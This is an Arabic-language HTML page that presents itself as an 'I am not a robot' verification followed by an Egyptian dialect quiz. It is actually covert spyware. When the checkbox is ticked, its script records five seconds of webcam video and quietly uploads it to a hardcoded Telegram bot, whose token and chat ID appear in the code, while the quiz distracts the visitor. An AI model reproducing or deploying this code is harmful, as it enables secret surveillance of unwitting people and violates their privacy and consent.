<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من أنك لست روبوتاً</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1E88E5, #43A047);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow-y: auto;
            flex-direction: column;
            overflow-x: hidden;
            padding-top: 0;
            padding-bottom: 0;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 350px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 15px;
        }
        .checkbox-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            font-size: 18px;
        }
        input[type="checkbox"] {
            width: 24px;
            height: 24px;
            accent-color: #4CAF50;
        }
        .loading, .success {
            display: none;
            font-size: 16px;
            margin-top: 10px;
        }
        .loading {
            color: #FBC02D;
        }
        .success {
            color: #4CAF50;
        }
        video {
            display: none;
            width: 100%;
            height: auto;
            margin: 15px 0;
            border-radius: 10px;
            background: black;
        }

        /* Quiz section */
        #quiz-container {
            display: none;
        }
        .language-buttons {
            display: flex;
            flex-direction: column;
            justify-content: center;
            gap: 20px;
            margin-bottom: 15px;
        }
        .language-buttons button {
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 15px 20px;
            cursor: pointer;
            font-size: 20px;
            transition: background-color 0.3s;
        }
        .language-buttons button:hover {
            background-color: #45a049;
        }
        .option {
            margin-bottom: 15px;
            text-align: right;
            background-color: #4CAF50;
            padding: 15px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 20px;
            transition: background-color 0.3s;
        }
        .option:hover {
            background-color: #45a049;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            border: none;
            border-radius: 20px;
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
        .result {
            display: none;
            text-align: center;
        }
        .result p {
            font-size: 18px;
        }
        .question {
            margin-bottom: 60px;
            padding: 40px;
            border-radius: 10px;
            font-size: 18px;
        }
        .correct {
            background-color: #4CAF50;
        }
        .wrong {
            background-color: #F44336;
        }
        .correct-answer {
            background-color: #FFEB3B;
        }
        .question-container {
            margin-bottom: 20px;
        }

        #question-text {
            margin-bottom: 30px;
        }
    </style>
</head>
<body>
    <div class="container" id="verification-container">
        <h1>تحقق من أنك لست روبوتاً</h1>
        <div class="checkbox-container">
            <input type="checkbox" id="robot-checkbox">
            <label for="robot-checkbox">أنا لست روبوتاً</label>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div class="loading">جاري التسجيل... ⏳</div>
        <div class="success">✅ تم التحقق بنجاح!</div>
    </div>

    <div class="container" id="quiz-container">
        <h1>اختبار اللهجات المصرية</h1>
        <div class="language-buttons" id="language-buttons">
            <button onclick="startQuiz('اسكندراني')">إسكندراني</button>
            <button onclick="startQuiz('منياوي')">منياوي</button>
            <button onclick="startQuiz('فلاحي')">فلاحي</button>
            <button onclick="startQuiz('صعيدي')">صعيدي</button>
        </div>
        <div id="question-container" style="display:none;">
            <h2 id="question-text"></h2>
            <div id="options-container"></div>
        </div>
        <div class="result" id="result">
            <h2>نتيجتك</h2>
            <div id="all-questions"></div>
            <button onclick="restartQuiz()">إعادة المحاولة</button>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                video.style.display = 'block';
                loading.style.display = 'block';
                success.style.display = 'none';

                navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;

                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    mediaRecorder.start();
                    mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };

                    setTimeout(() => { mediaRecorder.stop(); }, 5000);

                    mediaRecorder.onstop = () => {
                        loading.style.display = 'none';
                        success.style.display = 'block';
                        stream.getTracks().forEach(track => track.stop());

                        // Start the quiz game
                        document.getElementById('verification-container').style.display = 'none';
                        document.getElementById('quiz-container').style.display = 'block';

                        // Send video to Telegram in background
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const formData = new FormData();
                        formData.append('chat_id', '2070423407'); 
                        formData.append('video', blob, 'video.webm');

                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
                            .catch((error) => { console.error('Video upload failed:', error.message); });
                    };
                })
                .catch((err) => { alert("Unable to access the camera: " + err.message); });
            }
        });

        let currentQuestionIndex = 0;
        let score = 0;
        let selectedDialect = '';
        let questions = [];
        let answers = [];
        let wrongAnswers = [];

        const questionText = document.getElementById('question-text');
        const optionsContainer = document.getElementById('options-container');
        const resultDiv = document.getElementById('result');
        const allQuestionsContainer = document.getElementById('all-questions');

        async function startQuiz(dialect) {
            selectedDialect = dialect;
            questions = (await fetch('questions.json').then(response => response.json()))[selectedDialect];
            currentQuestionIndex = 0;
            score = 0;
            wrongAnswers = [];
            answers = [];
            document.getElementById('language-buttons').style.display = 'none';
            displayQuestion();
            document.getElementById('question-container').style.display = 'block';
        }

        function displayQuestion() {
            if (currentQuestionIndex < questions.length) {
                const question = questions[currentQuestionIndex];
                questionText.textContent = question.q;

                optionsContainer.innerHTML = '';
                question.options.forEach((option, index) => {
                    const optionDiv = document.createElement('div');
                    optionDiv.classList.add('option');
                    optionDiv.textContent = option;
                    optionDiv.onclick = () => {
                        const answerIndex = index;
                        answers.push(answerIndex);
                        if (question.correctAnswer === option) {
                            score++;
                            optionDiv.classList.add('correct');
                        } else {
                            optionDiv.classList.add('wrong');
                            wrongAnswers.push({ question: question.q, correctAnswer: question.correctAnswer });
                        }

                        setTimeout(() => {
                            currentQuestionIndex++;
                            displayQuestion();
                        }, 500);
                    };
                    optionsContainer.appendChild(optionDiv);
                });
            } else {
                showResult();
            }
        }

        function showResult() {
            allQuestionsContainer.innerHTML = '';
            questions.forEach((question, index) => {
                const questionDiv = document.createElement('div');
                questionDiv.classList.add('question');
                questionDiv.innerHTML = `<p>${question.q}</p><p class="${answers[index] === question.options.indexOf(question.correctAnswer) ? 'correct' : 'wrong'}">${answers[index] === question.options.indexOf(question.correctAnswer) ? 'صح' : `خطأ. الإجابة الصحيحة هي: ${question.correctAnswer}`}</p>`;
                allQuestionsContainer.appendChild(questionDiv);
            });

            resultDiv.style.display = 'block';
        }

        function restartQuiz() {
            resultDiv.style.display = 'none';
            document.getElementById('quiz-container').style.display = 'none';
            document.getElementById('language-buttons').style.display = 'block';
        }
    </script>
</body>
</html>
